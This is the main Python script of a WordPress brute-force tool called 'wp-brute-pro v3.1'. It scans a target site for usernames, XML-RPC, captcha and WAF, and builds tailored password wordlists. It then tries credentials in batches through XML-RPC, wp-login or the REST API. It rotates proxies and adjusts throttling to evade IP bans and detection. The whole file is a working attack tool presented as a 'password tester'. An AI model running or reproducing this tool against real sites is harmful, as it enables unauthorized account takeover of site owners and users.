#!/usr/bin/env python3
"""
wp-brute-pro v3.1 — WordPress Professional Password Tester
Colored TUI, arrow key selection, progress bar, proxy rotation
Multi-language: English (default) / Turkish
"""
import argparse
import json
import signal
import sys
import os
import time
import urllib3
urllib3.disable_warnings()

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.scanner import Scanner
from core.xmlrpc import XmlRpcAttack
from core.wplogin import WpLoginAttack
from core.restapi import RestApiAttack
from core.validator import Validator
from wordlist.generator import generate
from evasion.throttle import Throttle
from evasion.proxy import ProxyRotator
from state.tracker import Tracker
from output.reporter import Reporter
from lang import t, set_lang
import ui

# Global for graceful shutdown
_tracker = None
_reporter = None
_throttle = None
_scan_info = None


def graceful_shutdown(signum, frame):
    """Ctrl+C handler — save state and exit cleanly"""
    ui.batch_newline()
    print()
    ui.warning(t("interrupted"))
    if _tracker:
        _tracker.save_state()
        ui.info(t("state_saved"))
    if _reporter and _tracker and _throttle:
        _reporter.write_report(_scan_info, _tracker.state, _throttle.stats())
        ui.info(t("report_saved"))
    ui.info(t("resume_hint"))
    sys.exit(0)


signal.signal(signal.SIGINT, graceful_shutdown)


def format_eta(seconds):
    """Format seconds to human readable ETA"""
    if seconds < 60:
        return f"{int(seconds)}s"
    elif seconds < 3600:
        return f"{int(seconds // 60)}m {int(seconds % 60)}s"
    else:
        h = int(seconds // 3600)
        m = int((seconds % 3600) // 60)
        return f"{h}h {m}m"


def interactive_mode():
    ui.banner()

    # Language selection
    lang_idx = ui.select_menu(t("lang_select"), [
        t("lang_en"),
        t("lang_tr"),
    ], default=0)
    if lang_idx == 1:
        set_lang("tr")

    ui.header(t("config"))

    url = ui.ask_input(t("target_url"))
    if not url:
        ui.error(t("url_required"))
        sys.exit(1)
    if not url.startswith("http"):
        url = f"https://{url}"

    users = ui.ask_input(t("usernames"))
    company = ui.ask_input(t("company_name"))
    keywords = ui.ask_input(t("extra_keywords"))
    crawl = ui.ask_confirm(t("crawl_site"), True)
    wordlist = ui.ask_input(t("extra_wordlist"))

    method_idx = ui.select_menu(t("method_title"), [
        t("method_auto"), t("method_xmlrpc"),
        t("method_wplogin"), t("method_restapi"),
    ], default=0)
    method = ["auto", "xmlrpc", "wplogin", "restapi"][method_idx]

    proxy_file = ui.ask_input(t("proxy_file"))

    batch_idx = ui.select_menu(t("batch_title"), [
        t("batch_10"), t("batch_25"), t("batch_50"),
        t("batch_100"), t("batch_200"),
    ], default=2)
    batch_size = [10, 25, 50, 100, 200][batch_idx]

    delay_idx = ui.select_menu(t("delay_title"), [
        t("delay_05"), t("delay_1"), t("delay_2"),
        t("delay_3"), t("delay_5"), t("delay_10"),
    ], default=3)
    delay = [0.5, 1.0, 2.0, 3.0, 5.0, 10.0][delay_idx]

    max_passwords = ui.ask_input(t("max_passwords"), "0")
    max_passwords = int(max_passwords) if max_passwords.isdigit() else 0

    output_dir = ui.ask_input(t("output_dir"), "results")

    # Risk assessment
    risk_score = 0
    if batch_size >= 100: risk_score += 2
    elif batch_size >= 50: risk_score += 1
    if delay <= 1: risk_score += 2
    elif delay <= 2: risk_score += 1
    if not proxy_file: risk_score += 1

    print()
    if risk_score >= 4:
        ui.warning(t("risk_high"))
        ui.info(t("risk_high_tip"))
    elif risk_score >= 2:
        ui.info(t("risk_medium"))
    else:
        ui.success(t("risk_low"))

    risk_levels = [t("risk_low_label")] * 2 + [t("risk_medium_label")] * 2 + [t("risk_high_label")] * 2
    risk_text = risk_levels[min(risk_score, 5)]

    print()
    ui.stats_table([
        (t("stat_target"), url),
        (t("stat_user"), users or t("stat_auto")),
        (t("stat_company"), company or "-"),
        (t("stat_method"), method),
        (t("stat_batch"), f"{batch_size} {t('stat_pwd_per_req')}"),
        (t("stat_delay"), f"{delay}s"),
        (t("stat_proxy"), proxy_file or t("stat_none")),
        (t("stat_max"), str(max_passwords) if max_passwords > 0 else t("stat_unlimited")),
        (t("risk_label"), risk_text),
    ])

    if not ui.ask_confirm(t("start_confirm"), True):
        ui.info(t("cancelled"))
        sys.exit(0)

    return {
        "url": url, "users": users, "company": company,
        "keywords": keywords, "crawl": crawl,
        "wordlist": wordlist or None, "method": method,
        "proxy_file": proxy_file or None, "proxy": None,
        "batch_size": batch_size, "delay": delay,
        "max_passwords": max_passwords,
        "output": output_dir, "resume": True,
        "no_scan": False, "verbose": True,
        "dry_run": False, "no_color": False,
    }


def parse_args():
    p = argparse.ArgumentParser(description="WP-BRUTE-PRO v3.1")
    p.add_argument("-u", "--url", help="Target WordPress URL")
    p.add_argument("-U", "--users", help="Usernames (comma separated)")
    p.add_argument("--method", default="auto", choices=["auto", "xmlrpc", "wplogin", "restapi"])
    p.add_argument("--batch-size", type=int, default=50)
    p.add_argument("--delay", type=float, default=3.0)
    p.add_argument("--company", help="Company name")
    p.add_argument("--keywords", help="Extra keywords")
    p.add_argument("--crawl", action="store_true")
    p.add_argument("--wordlist", help="Extra wordlist file")
    p.add_argument("--proxy-list", help="Proxy list file")
    p.add_argument("--proxy", help="Single proxy")
    p.add_argument("--output", default="results")
    p.add_argument("--config", help="JSON config file")
    p.add_argument("--resume", action="store_true")
    p.add_argument("--no-scan", action="store_true")
    p.add_argument("--lang", default="en", choices=["en", "tr"])
    p.add_argument("--max-passwords", type=int, default=0, help="Max passwords to try (0=unlimited)")
    p.add_argument("--dry-run", action="store_true", help="Generate wordlist only, don't attack")
    p.add_argument("--no-color", action="store_true", help="Disable colored output")
    p.add_argument("--export-json", help="Export results to JSON file")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("-i", "--interactive", action="store_true")
    return p.parse_args()


def run_attack(config):
    global _tracker, _reporter, _throttle, _scan_info

    url = config["url"].rstrip('/')
    usernames = [u.strip() for u in config.get("users", "").split(',') if u.strip()]
    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                              config.get("output", "results"))
    max_passwords = config.get("max_passwords", 0)
    dry_run = config.get("dry_run", False)

    # No-color mode
    if config.get("no_color"):
        ui.disable_colors()

    reporter = Reporter(output_dir)
    tracker = Tracker(output_dir)
    throttle = Throttle(config.get("delay", 3.0), config.get("batch_size", 50))
    validator = Validator(url)
    proxy_rotator = ProxyRotator(
        proxy_file=config.get("proxy_file"),
        proxies=[config["proxy"]] if config.get("proxy") else None
    )

    # Set globals for graceful shutdown
    _tracker = tracker
    _reporter = reporter
    _throttle = throttle

    ui.banner()
    tracker.set_target(url)

    # ===== PHASE 1: RECON =====
    scan_info = None
    if not config.get("no_scan"):
        ui.header(t("phase1"))
        ui.spinner(t("scanning"), 1)
        scanner = Scanner(url, proxies=proxy_rotator.get_current())
        scan_info = scanner.scan()
        _scan_info = scan_info

        xmlrpc_text = (f"{t('scan_active')} ({scan_info['xmlrpc_methods']} {t('scan_methods')})"
                       if scan_info["xmlrpc_active"] else t("scan_disabled"))

        ui.scan_result(t("scan_wp"), scan_info["wp_version"] or "?",
                       "good" if scan_info["wp_version"] else "warn")
        ui.scan_result(t("scan_login"), scan_info["login_url"] or t("scan_not_found"),
                       "good" if scan_info["login_url"] else "bad")
        ui.scan_result(t("scan_xmlrpc"), xmlrpc_text,
                       "bad" if scan_info["xmlrpc_active"] else "good")
        ui.scan_result(t("scan_captcha"), t("scan_yes") if scan_info["has_captcha"] else t("scan_no"),
                       "good" if scan_info["has_captcha"] else "bad")
        ui.scan_result(t("scan_waf"), scan_info["waf_name"] or t("scan_no"),
                       "good" if scan_info["has_waf"] else "bad")
        ui.scan_result(t("scan_users"),
                       ', '.join(u['slug'] for u in scan_info["users"]) or "?",
                       "bad" if scan_info["users"] else "good")
        ui.scan_result(t("scan_plugins"),
                       ', '.join(scan_info["plugins"][:5]) or "?", "info")

        if scan_info["users"]:
            for u in scan_info["users"]:
                if u["slug"] not in usernames:
                    usernames.append(u["slug"])
                    ui.info(f"  {t('scan_new_user')}: {u['slug']}")

    if not usernames:
        ui.error(t("no_user"))
        sys.exit(1)

    # ===== PHASE 2: STRATEGY =====
    ui.header(t("phase2"))
    method = config.get("method", "auto")

    if method == "auto":
        if scan_info and scan_info["xmlrpc_active"]:
            method = "xmlrpc"
            ui.success(t("strategy_xmlrpc"))
        elif scan_info and scan_info["login_url"]:
            method = "wplogin"
            ui.info(t("strategy_wplogin"))
        else:
            method = "restapi"
            ui.info(t("strategy_restapi"))

    if scan_info and scan_info.get("has_captcha") and method == "wplogin":
        ui.warning(t("strategy_captcha_switch"))
        if scan_info.get("xmlrpc_active"):
            method = "xmlrpc"

    ui.info(f"{t('stat_method')}: {method}")
    if proxy_rotator.has_proxies():
        ui.info(f"{t('stat_proxy')}: {proxy_rotator.available_count()}")

    # ===== PHASE 3: WORDLIST =====
    ui.header(t("phase3"))
    ui.spinner(t("generating"), 1)
    passwords = generate(
        usernames=usernames,
        company=config.get("company"),
        keywords=config.get("keywords"),
        crawl_url=url if config.get("crawl") else None,
        extra_wordlist=config.get("wordlist"),
    )

    # Apply max limit
    if max_passwords > 0 and len(passwords) > max_passwords:
        passwords = passwords[:max_passwords]
        ui.warning(f"{t('stat_max')}: {max_passwords}")

    tracker.set_generated(len(passwords))
    ui.success(f"{len(passwords)} {t('generated')}")
    ui.info(f"{t('users_label')}: {', '.join(usernames)}")

    # ===== DRY RUN =====
    if dry_run:
        ui.header(t("dry_run_header"))
        wordlist_file = os.path.join(output_dir, "wordlist.txt")
        os.makedirs(output_dir, exist_ok=True)
        with open(wordlist_file, "w", encoding="utf-8") as f:
            for pwd in passwords:
                f.write(pwd + "\n")
        ui.success(f"{t('dry_run_saved')}: {wordlist_file}")
        ui.info(f"{len(passwords)} {t('passwords')}")
        return

    # ===== PHASE 4: ATTACK =====
    ui.header(t("phase4"))
    attack_start = time.time()

    for username in usernames:
        new_passwords = tracker.filter_new(username, passwords) if config.get("resume") else passwords
        if not new_passwords:
            ui.info(f"[{username}] {t('all_tried')}")
            continue

        total_b = (len(new_passwords) + throttle.batch_size - 1) // throttle.batch_size
        ui.info(f"[{username}] {len(new_passwords)} {t('passwords')}, {total_b} {t('batches')}")
        print()

        found = False
        user_tried = 0
        user_start = time.time()

        if method == "xmlrpc":
            attacker = XmlRpcAttack(url)
            for bn, i in enumerate(range(0, len(new_passwords), throttle.batch_size), 1):
                batch = new_passwords[i:i + throttle.batch_size]
                current_proxy = proxy_rotator.get_current()
                status_code, resp_text = attacker.send_batch(username, batch, proxies=current_proxy)

                if status_code == 200:
                    throttle.success()
                    candidate = attacker.parse_response(resp_text, batch)
                    if candidate:
                        ui.batch_result(bn, total_b, user_tried, len(new_passwords), status="candidate")
                        ui.batch_newline()
                        ui.warning(f"{t('candidate')}: {candidate} — {t('verifying')}")
                        if validator.verify(username, candidate):
                            ui.found_password(username, candidate)
                            tracker.mark_found(username, candidate)
                            reporter.found(username, candidate)
                            found = True
                            break
                        else:
                            ui.error(f"{t('false_positive')}: {candidate}")
                    else:
                        user_tried += len(batch)
                        # ETA calculation
                        elapsed = time.time() - user_start
                        if user_tried > 0:
                            rate = user_tried / elapsed
                            remaining = len(new_passwords) - user_tried
                            eta = remaining / rate if rate > 0 else 0
                            eta_str = format_eta(eta)
                        else:
                            eta_str = "..."
                        ui.batch_result(bn, total_b, user_tried, len(new_passwords),
                                        status="miss", eta=eta_str)

                elif status_code in [403, 429, 503]:
                    penalty = throttle.blocked(status_code)
                    ui.batch_result(bn, total_b, user_tried, len(new_passwords), status="blocked")
                    ui.batch_newline()
                    ui.warning(f"HTTP {status_code} — {penalty}s {t('waiting')}")

                    if throttle.is_banned():
                        if proxy_rotator.has_proxies():
                            proxy_rotator.mark_banned(current_proxy)
                            if proxy_rotator.rotate():
                                throttle.mark_ban()
                                ui.info(f"{t('banned_proxy')} ({proxy_rotator.available_count()} {t('remaining')})")
                                continue
                            else:
                                ui.error(t("all_proxies_banned"))
                                break
                        ui.error(t("ip_banned"))
                        throttle.wait_penalty(penalty)
                        throttle.mark_ban()

                elif status_code < 0:
                    penalty = throttle.timeout()
                    ui.batch_result(bn, total_b, user_tried, len(new_passwords), status="blocked")
                    ui.batch_newline()
                    if throttle.is_banned():
                        if proxy_rotator.has_proxies():
                            proxy_rotator.mark_banned(current_proxy)
                            proxy_rotator.rotate()
                            throttle.mark_ban()
                            ui.info(t("banned_proxy"))
                            continue
                        ui.error(f"{t('connection_lost')} — {penalty}s {t('waiting')}")
                        throttle.wait_penalty(penalty)
                        throttle.mark_ban()

                tracker.mark_tried(username, batch)
                tracker.update_user(username, user_tried)
                throttle.wait()

        elif method in ["wplogin", "restapi"]:
            login_url = (scan_info["login_url"] if scan_info and scan_info.get("login_url")
                         else f"{url}/wp-login.php")
            attacker = WpLoginAttack(login_url) if method == "wplogin" else RestApiAttack(url)
            for idx, pwd in enumerate(new_passwords):
                result = attacker.try_login(username, pwd)
                user_tried += 1
                if result is True:
                    if validator.verify(username, pwd):
                        ui.batch_newline()
                        ui.found_password(username, pwd)
                        tracker.mark_found(username, pwd)
                        reporter.found(username, pwd)
                        found = True
                        break
                elif result is None:
                    throttle.timeout()
                    if throttle.is_banned():
                        ui.batch_newline()
                        ui.error(t("ban_detected"))
                        break
                if idx % 10 == 0:
                    elapsed = time.time() - user_start
                    rate = user_tried / elapsed if elapsed > 0 else 1
                    remaining = len(new_passwords) - user_tried
                    eta_str = format_eta(remaining / rate) if rate > 0 else "..."
                    ui.batch_result(idx // 10 + 1, len(new_passwords) // 10,
                                    user_tried, len(new_passwords), status="miss", eta=eta_str)
                tracker.mark_tried(username, [pwd])
                throttle.wait()

        ui.batch_newline()
        tracker.update_user(username, user_tried, "found" if found else "done")
        if not found:
            ui.warning(f"{username}: {t('not_found')} ({user_tried} {t('attempts')})")

        # Stop after first found if user wants
        if found and config.get("stop_on_found", True):
            remaining_users = [u for u in usernames if u != username and
                               tracker.state.get("users", {}).get(u, {}).get("status") != "done"]
            if remaining_users:
                ui.info(f"{t('found_skip')}: {', '.join(remaining_users)}")
            break

        print()

    # ===== PHASE 5: REPORT =====
    total_time = time.time() - attack_start
    ui.header(t("phase5"))
    tracker.save_state()
    reporter.write_report(scan_info, tracker.state, throttle.stats())

    ui.stats_table([
        (t("total_tried"), tracker.state["total_tried"]),
        (t("total_generated"), tracker.state["total_generated"]),
        (t("found_count"), len(tracker.state["found"])),
        (t("http_requests"), throttle.stats()["total_requests"]),
        (t("blocks"), throttle.stats()["total_blocks"]),
        (t("ban_count"), throttle.stats()["ban_count"]),
        (t("total_time"), format_eta(total_time)),
    ])

    if tracker.state["found"]:
        ui.header(t("found_header"))
        for f in tracker.state["found"]:
            ui.found_password(f["username"], f["password"])
    else:
        ui.info(t("no_password"))

    # JSON export
    export_path = config.get("export_json")
    if export_path:
        export_data = {
            "target": url,
            "scan": scan_info,
            "results": tracker.state,
            "throttle": throttle.stats(),
            "total_time_seconds": round(total_time, 1),
        }
        with open(export_path, "w", encoding="utf-8") as f:
            json.dump(export_data, f, indent=2, ensure_ascii=False)
        ui.success(f"JSON: {export_path}")

    ui.info(f"{t('report_at')}: {output_dir}/report.md")
    ui.info(f"{t('log_at')}: {output_dir}/log.txt")


def main():
    args = parse_args()

    if hasattr(args, 'lang') and args.lang:
        set_lang(args.lang)

    if hasattr(args, 'no_color') and args.no_color:
        ui.disable_colors()

    if args.config:
        with open(args.config) as f:
            config = json.load(f)
        if "lang" in config:
            set_lang(config["lang"])
    elif args.interactive or not args.url:
        config = interactive_mode()
    else:
        config = {
            "url": args.url, "users": args.users or "",
            "method": args.method, "batch_size": args.batch_size,
            "delay": args.delay, "company": args.company,
            "keywords": args.keywords, "crawl": args.crawl,
            "wordlist": args.wordlist, "proxy_file": args.proxy_list,
            "proxy": args.proxy, "output": args.output,
            "resume": args.resume, "no_scan": args.no_scan,
            "verbose": args.verbose, "max_passwords": args.max_passwords,
            "dry_run": args.dry_run, "no_color": args.no_color,
            "export_json": args.export_json,
        }

    run_attack(config)


if __name__ == "__main__":
    main()
